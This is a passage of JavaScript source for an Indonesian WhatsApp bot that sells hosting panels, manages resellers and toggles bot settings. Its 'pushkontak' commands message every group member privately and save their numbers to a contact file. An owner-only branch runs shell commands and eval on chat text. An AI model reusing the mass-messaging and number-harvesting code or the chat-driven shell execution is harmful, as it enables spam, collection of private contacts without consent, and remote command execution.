qckaizen("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return qckaizen("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
qckaizen("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return qckaizen(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoread": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return qckaizen("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = true
qckaizen("Berhasil Menyalakan *Autoread ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return qckaizen("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = false
qckaizen("Berhasil Mematikan *Autoread ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return qckaizen(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "anticall": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return qckaizen("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = true
qckaizen("Berhasil Menyalakan *Anticall ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return qckaizen("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = false
qckaizen("Berhasil Mematikan *Anticall ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return qckaizen(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {

if (!isOwner) return kenReply(msg.owner)
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Anticall : ${global.anticall ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Welcome : ${global.welcome ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
qckaizen(teks)
}
break
case "owner": case "creator": {

ken.sendContact(m.chat, [`${owner[0].split("@")[0]}`], "Developer Bot", m)
}
break
case "pushkontak": {

if (!isOwner) return kenReply(msg.owner)
if (!isGroup) return kenReply(msg.group)
if (!text) return qckaizen(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
qckaizen(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await ken.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
qckaizen(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await ken.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: qchanel })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return qckaizen(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await ken.groupMetadata(`${idnya}`)
} catch (e) {
return qckaizen("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
qckaizen(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await ken.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
qckaizen(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await ken.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: qchanel })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "cekidgc": {

if (!isOwner) return kenReply(msg.owner)
if (!isGroup) return kenReply(msg.group)
qckaizen(`${m.chat}`)
}
break
case "listgc": case"listgrup": {

let gcall = Object.values(await ken.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
ken.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "done": {
if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example("Nama Barang\n\n*Contoh :* Panel Unlimited"))
if (!text.split(",")) return qckaizen(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
var teks = `*Allhamdulilah Transaksi Done✅*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
📦 Produk: ${text}
🗓️ Date: ${tanggal(Date.now())}
🤝 Status: Done ✅
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
📞my contacts : wa.link/ggy5nr
⚡about k!4izénᯤ : linktr.ee/KenHosting
▬▭▬▭▬▭▬▭▬▭▬▭▬▭`
return qckaizen(teks)
}
break
case "addres": {

if (!isOwner) return kenReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return qckaizen(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Reseller`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
qckaizen(`Berhasil Terdaftar ${orang.split('@')[0]} Di Database Reseller`)
} else {
return qckaizen(example("@tag/62838XXX"))
}}
break
case "delres": {

if (!isOwner) return kenReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return qckaizen(`User ${orang.split('@')[0]} Tidak Terdaftar Di Database Reseller`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
qckaizen(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Reseller`)
} else {
return qckaizen(example("@tag/62838XXX"))
}}
break
case "listres": {

if (!isOwner) return kenReply(msg.owner)
if (reseller.length < 1) return qckaizen("Tidak Ada Yang Terdaftar Di Database Reseller")
let teksnya = ` List Yang Terdaftar Di Database reseller\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
ken.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qchanel})
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isOwner && !isReseller) return kenReply(msg.owner)
if (!q) return qckaizen(example("username"))
global.panel = q
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await qckaizen("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Akun Panel ✅*

*👤Username :* ${user.username}
*🔐Password :* ${password}
*🌐Login :* ${global.domain}
*🗓️Tanggal :* ${tanggal(Date.now())}

*Note :*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await ken.sendMessage(orang, {
  image: {
    url: "./media/kaizen.jpg"
  },
  caption: teks
}, { quoted: qtoko })
delete global.panel
}
break
case "cadp": {
if (!isOwner) return kenReply(msg.owner)
if (!q) return qckaizen(example("username"))
let username = q.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await qckaizen("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Admin Panel ✅*

*👤Username :* ${user.username}
*🔐Password :* ${password}
*🌐Login :* ${global.domain}
*🗓️Tanggal :* ${tanggal(Date.now())}

*Note :*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await ken.sendMessage(orang, {
  image: {
    url: "./media/kaizen.jpg"
  },
  caption: teks
}, { quoted: qtoko })
}
break
case "listp": {
if (!isOwner) return kenReply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return qckaizen("Tidak Ada Server Bot")
let messageText = "\n *Berikut List Server*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await ken.sendMessage(m.chat, {text: messageText}, {quoted: qchanel})
}
break
case "delp": {
if (!isOwner) return kenReply(msg.owner)
if (!q) return qckaizen(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(q) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return qckaizen("Server panel tidak ditemukan!")
qckaizen(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
case "danapay": {
if (!isOwner) return kenReply(msg.owner)
if (global.dana == false) return qckaizen('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
ken.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (!isOwner) return kenReply(msg.owner)
if (global.gopay == false) return qckaizen('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
ken.sendText(m.chat, teks, qchanel)
}
break
case "qrispay": {
if (!isOwner) return kenReply(msg.owner)
if (global.qris == false) return qckaizen('Payment Qris Tidak Tersedia')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Qris DiAtas*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
ken.sendMessage(m.chat, {image: global.qris, caption: teks}, {quoted: qchanel})
}
break
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return ken.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return ken.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
ken.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
ken.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return ken.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return ken.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
//ken.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})